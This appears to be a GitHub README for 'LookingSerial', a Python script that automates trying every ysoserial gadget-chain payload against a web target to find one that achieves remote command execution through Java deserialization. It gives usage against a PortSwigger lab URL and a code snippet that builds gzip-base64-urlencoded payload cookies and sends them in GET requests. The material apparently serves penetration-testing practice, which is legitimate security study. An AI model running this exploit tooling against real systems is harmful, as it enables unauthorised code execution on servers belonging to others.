# LookingSerial

A tool for fuzzing the right payload for the ysoserial tool

## Description

While using the tool: https://github.com/frohoff/ysoserial I faced the problem of trying to figure out what is the right payload to use.

In order to get past this issue I created a script that is able to try all of the possible payloads and run the required `command` on each one of them.

This way I was able to find the working payload much more easily in an automated way.

## Usage

In order to use this script, you will have to enter:

`-u` : The url we are going to send our requests to

`-p` : The file containing the list of payloads

`-c` : The command we want to execute

```
git clone https://github.com/nirzaaa/LookingSerial.git
cd LookingSerial
python3 looking_serial.py -u "https://<YOUR-LAB>.web-security-academy.net/my-account" -p "payloads.txt" -c "whoami"
```

p.s.
In our case we will send the serialized through the cookie as can be seen at the script and can be adjusted to the specific case.

### Example of adjusting the script

In another scenario I had to make 2 adjustments for the script to work:

1. The serialized cookie wasn't at the session cookie but at the `admin-prefs` cookie, so I had to adjust accordingly the cookies I sent in my GET request.

2. Instead of base64 -> urlencode the cookie, I had to gzip -> base64 -> urlencode the cookie.

You can find the changes I made in the snippet below:

```python
def create_cookie(payload, command):
    os.system(f"PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ~/Downloads/ysoserial-all.jar {payload} '{command}' | gzip > cookie.gz")
    os.system("cat cookie.gz | base64 > cookie_base64.txt")
    with open('cookie_base64.txt') as f:
        lines = f.read()
    cookie = lines.strip()
    return urllib.parse.quote(cookie)

def send_cookie(url, cookie):
    pattern = r"https://([^/]+)"
    match = re.search(pattern, url)
    domain = match.group(1)
    session_cookie = "<SESSION COOKIE>"
    headers = {
        "Host": "{}".format(domain),
        "Cookie": "admin-prefs={}; session={}".format(cookie, session_cookie),
    }

    response = requests.get(url, headers=headers)

    return response
```

## Suggestions
Have any suggestions? Something is missing? (😬) You can leave us an issue and we will look into it 😃
